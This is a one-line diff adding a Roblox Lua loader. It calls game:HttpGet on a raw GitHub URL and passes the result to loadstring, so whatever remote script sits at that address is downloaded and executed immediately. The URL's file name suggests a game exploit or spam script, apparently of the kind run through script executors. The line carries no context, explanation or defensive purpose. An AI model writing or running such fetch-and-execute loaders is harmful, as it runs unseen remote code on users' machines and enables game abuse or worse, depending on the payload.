@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/wideopen-motorcycle-2xp-weekend-customiz-spam1-l7p8y35qmjn6lb.lua"))()
